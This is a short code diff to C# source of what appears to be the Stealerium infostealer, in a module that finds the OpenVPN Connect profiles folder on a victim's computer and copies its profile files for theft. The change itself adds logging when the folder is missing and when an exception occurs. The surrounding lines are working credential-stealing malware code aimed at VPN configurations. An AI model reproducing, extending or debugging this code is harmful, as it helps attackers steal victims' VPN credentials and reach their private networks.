@@ -14,7 +14,11 @@ namespace Stealerium.Target.VPN
                 "OpenVPN Connect\\profiles");
             // Stop if not exists
             if (!Directory.Exists(vpn))
+            {
+                Logging.Log($"Open VPN >> Not Exist!\n");
                 return;
+            }
+                
             try
             {
                 // Create directory to save profiles
@@ -29,9 +33,9 @@ namespace Stealerium.Target.VPN
                                                     + Path.GetFileName(file)));
                     }
             }
-            catch
+            catch(Exception ex)
             {
-                // ignored
+                Logging.Log($"Open VPN >> Exception : {ex.Message}\n");
             }
         }
     }
